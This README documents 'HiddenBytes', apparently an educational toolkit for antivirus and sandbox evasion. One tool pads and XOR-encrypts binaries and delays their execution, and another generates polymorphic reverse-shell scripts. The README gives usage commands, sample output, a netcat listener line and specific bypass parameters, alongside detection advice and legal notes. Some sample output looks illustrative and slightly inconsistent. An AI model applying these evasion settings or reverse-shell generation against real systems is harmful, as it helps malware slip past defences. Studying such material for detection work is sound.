# HiddenBytes - Binary Evasion & Polymorphism Toolkit

> **DISCLAIMER:** This project is strictly for educational purposes in an authorized, isolated lab environment. Unauthorized use of these techniques is illegal and unethical. All testing must be performed in your own controlled VM.

---

## Table of Contents

1. [Overview](#overview)
2. [Why This Project Matters](#why-this-project-matters)
3. [Project Structure](#project-structure)
4. [Environment Setup](#environment-setup)
5. [Evasion Program](#evasion-program)
6. [Polymorphic Program](#polymorphic-program)
7. [Technical Insights](#technical-insights)
8. [Defensive Recommendations](#defensive-recommendations)
9. [Ethical & Legal Report](#ethical--legal-report)
10. [Resources](#resources)

---

## Overview

HiddenBytes is a two-program cybersecurity toolkit that demonstrates:

- **Evasion (`evasion.py`):** How binaries can be encrypted and padded to bypass static AV detection
- **Polymorphism (`polymorph.py`):** How code self-modifies across generations to defeat signature databases

By building these tools, you develop the attacker's mental model — which is the foundation of effective defence.

---

## Why This Project Matters

| Role | Benefit |
|---|---|
| Red Teamer | Understand evasion to simulate realistic attack scenarios |
| Blue Teamer | Know what you're looking for in EDR telemetry |
| Malware Analyst | Recognize polymorphic patterns in reverse engineering |
| AV Developer | Build heuristics that catch behavior, not just signatures |

---

## Project Structure

```
hiddenbytes/
├── src/
│   ├── evasion.py          # Binary encryption & obfuscation tool
│   └── polymorph.py        # Polymorphic binary generator with reverse shell
├── docs/
│   ├── README.md           # This file
│   ├── PLANNING.md         # Project planning & decision log
│   └── CASE_STUDY.md       # Technical case study
```

---

## Environment Setup

### Requirements

- Python 3.10+
- Windows 10/11 VM (VirtualBox / VMware / UTM on Apple Silicon)
- Network isolation: Host-Only or Internal Network mode

### Installation

```bash
git clone <repo>
cd hiddenbytes
pip install -r requirements.txt   # no third-party deps required
```

### VM Setup (Mandatory)

| Platform | Hypervisor | Notes |
|---|---|---|
| Windows / Linux | VirtualBox or VMware | Use Host-Only network adapter |
| Apple Silicon | UTM or Parallels | Windows 11 ARM ISO required |

**Never test on your host machine or a production system.**

---

## Evasion Program

### How It Works

```
Original Binary
      │
      ▼
  SHA-256 Hash ──────────────────────► Embedded in stub for integrity
      │
      ▼
  XOR Encrypt (random 32-byte key) ──► Key embedded in stub
      │
      ▼
  Null-byte Padding (e.g. 101 MB) ──► Bypasses sandbox size limits
      │
      ▼
  Prepend Loader Stub ────────────────► Stub decrypts & executes at runtime
      │
      ▼
  obfuscated.exe
```

### Usage

```bash
$ python evasion.py --help

Evasion Program Usage:
  --encrypt <target-binary>    Encrypt the target binary
  --output  <output-binary>    Output file name (default: obfuscated.exe)
  --add-size <size-in-mb>      Inflate binary to this size in MB
  --delay <seconds>            Execution delay in seconds (default: 101)

$ python evasion.py --encrypt target.exe --output obfuscated.exe --add-size 101 --delay 101
[INFO] Reading target binary: target.exe
[INFO] SHA-256 of original: 3a7f1c2d...
[INFO] Encrypting with XOR key (first 8 bytes): a3f1c2d4e5b6c7d8
[INFO] Padding binary from 0.1 MB → 101 MB
[INFO] Encryption successful!
[INFO] Encrypted binary saved as: obfuscated.exe
[INFO] Final size: 101.00 MB
[INFO] Execution delay embedded: 101s
```

### Running the Encrypted Binary

```
$ python obfuscated.exe
[INFO] Execution delayed by 101 seconds...
[INFO] Binary decrypted successfully.
[INFO] Target program executed.
```

### Encryption Method: XOR

XOR encryption is used because:
- **Symmetric:** Encrypt and decrypt are the same operation
- **Keyless appearance:** Encrypted bytes look like random noise to static scanners
- **Speed:** Negligible performance overhead
- **Realism:** Widely used in real-world commodity malware as a first obfuscation layer

The 32-byte random key is embedded in the loader stub. Each encryption run produces a different key, meaning each obfuscated output has a unique binary signature.

### Stealth Techniques Implemented

| Technique | Description | AV Bypass Mechanism |
|---|---|---|
| XOR encryption | Scrambles payload bytes | Defeats static signature matching |
| File size inflation | Pads to 101 MB with null bytes | Bypasses sandbox size-limit heuristics |
| Execution delay | Sleeps 101 seconds before executing | Evades sandbox time limits (~30-60s typical) |
| Integrity check | SHA-256 validation before execution | Detects tampering during transit |

---

## Polymorphic Program

### How It Works

A polymorphic binary changes its **non-functional** code (junk variables, comments, string constants, signature IDs) while preserving its **core payload logic** (the reverse shell). This means every generated binary has a unique SHA-256 hash, defeating hash-based AV signatures.

```
Mutation Engine
      │
      ├─► New random signature ID (12-char hex)
      ├─► New junk variable block (6–12 random-named variables)
      ├─► New generation timestamp
      └─► Reverse shell payload (unchanged logic, different bytes)
            │
            ▼
      polymorphic.py  (unique hash each generation)
```

### Usage

```bash
$ python polymorph.py --help

Polymorphic Program Usage:
  --generate <output-binary>   Generate a polymorphic binary
  --payload  <IP:PORT>         Reverse shell listener (default: 127.0.0.1:4444)
  --demo                       Show signature drift across 5 generations

$ python polymorph.py --generate polymorphic.py --payload 127.0.0.1:4444
[INFO] Polymorphic binary generated: polymorphic.py
[INFO] Signature ID: A3F1C2D4E5B6
[INFO] Payload target: 127.0.0.1:4444
[INFO] Polymorphic signature updated successfully.
[INFO] Reverse shell initialized. Attempting connection to attacker...

$ python polymorph.py --demo
[INFO] Gen 1: SigID=A3F1C2D4E5B6  SHA256_prefix=9e2a1b3c4d5e6f7a
[INFO] Gen 2: SigID=B4E2D3F1A5C6  SHA256_prefix=1f3c5d7e9a2b4c6d
[INFO] Gen 3: SigID=C5F3E4G2B6D7  SHA256_prefix=3b5e7f9c1d3e5f7b
[INFO] ✓ All generations produced unique hashes — signature evasion confirmed.
```

### Reverse Shell Explanation

A reverse shell makes the **target** initiate the connection **back to the attacker** — bypassing most inbound firewall rules.

```
Attacker Machine                   Target Machine
(nc -lvnp 4444) ◄── TCP connect ── (polymorphic.py)
       │                                    │
       ◄──────── shell I/O ────────────────►
```

**Detection indicators:**
- Unusual parent→child process relationships (e.g., python → /bin/sh)
- Outbound connections from non-browser processes on non-standard ports
- High-frequency reconnect attempts (beaconing behavior)

---

## Technical Insights

### Binary Structure Analysis

Windows PE files (`.exe`) begin with the MZ header (`4D 5A`). After XOR encryption, this header is scrambled — static PE parsers fail, which is why AV tools that rely on PE structure analysis miss the payload.

### Entropy Analysis

Encrypted and random-padded binaries have high Shannon entropy (approaching 8.0 bits/byte for the encrypted section, near 0 for the null-byte padding). Defenders can use entropy scanning as a detection signal:

- High entropy in executable sections → possible packed/encrypted payload
- Large zero-byte regions at file end → possible size manipulation

### Sandbox Evasion

Modern sandboxes run binaries for 30–120 seconds and observe behavior. The 101-second delay is specifically chosen to exceed the typical 60-second sandbox window. Combined with the large file size (skipped by many cloud scanners), this demonstrates two complementary evasion heuristics.

---

## Defensive Recommendations

1. **Behavioral Detection over Signatures**
   Use EDR solutions that monitor process behavior (what a program *does*) rather than just its hash or byte pattern.

2. **Entropy Scanning**
   Flag executables with anomalously high entropy in their code sections using tools like YARA with entropy conditions.

3. **Process Lineage Monitoring**
   Alert on unexpected parent-child relationships: `python.exe` spawning `cmd.exe` or `/bin/sh` is a strong indicator.

4. **Network Behavioral Analytics**
   Monitor for beaconing: regular outbound connections at fixed intervals from non-browser processes.

5. **Extended Sandbox Timeouts**
   Configure sandboxes to run samples for 3–5 minutes, not just 30 seconds. Use VM snapshots to enable long-running analysis.

6. **File Size Policy**
   Do not skip scanning large files — instead, sample-scan them or extract and analyze their embedded sections.

7. **YARA Rules for Polymorphic Patterns**
   Write YARA rules targeting the *structure* of polymorphic code (junk var patterns, marker strings) not just specific byte sequences.

8. **Memory Forensics**
   Use Volatility or similar tools to detect decrypted payloads in memory that never touch disk.

---

## Ethical & Legal Report

### Ethical Responsibilities

Everyone who uses these techniques carries a professional and moral obligation to:

- **Obtain written authorization** before any testing (penetration test agreement, bug bounty scope)
- **Contain all testing** to isolated, purpose-built environments
- **Disclose findings** to affected parties through responsible disclosure
- **Never weaponize** tools developed in educational contexts

### Legal Considerations

| Jurisdiction | Relevant Law |
|---|---|
| United States | Computer Fraud and Abuse Act (CFAA) |
| United Kingdom | Computer Misuse Act 1990 |
| European Union | Directive on Attacks Against Information Systems |
| Kenya | Computer Misuse and Cybercrimes Act 2018 |

Unauthorized use of reverse shells, obfuscated binaries, or any component of this toolkit against systems you do not own or have explicit written permission to test is a criminal offence in virtually every jurisdiction.

### Responsible Use Framework

This project aligns with the MITRE ATT&CK framework — specifically:
- **T1027** — Obfuscated Files or Information
- **T1059** — Command and Scripting Interpreter
- **T1071** — Application Layer Protocol

Understanding these TTPs enables defenders to build detection coverage against them.

---

## Resources

- [MITRE ATT&CK Framework](https://attack.mitre.org)
- [VirtualBox Downloads](https://www.virtualbox.org/wiki/Downloads)
- [UTM for macOS](https://mac.getutm.app)
- [Windows 11 ARM Insider Preview](https://www.microsoft.com/en-us/software-download/windowsinsiderpreviewarm64)
- [YARA Documentation](https://yara.readthedocs.io)
- [Volatility Memory Forensics](https://volatilityfoundation.org)
- [PE File Format Reference](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
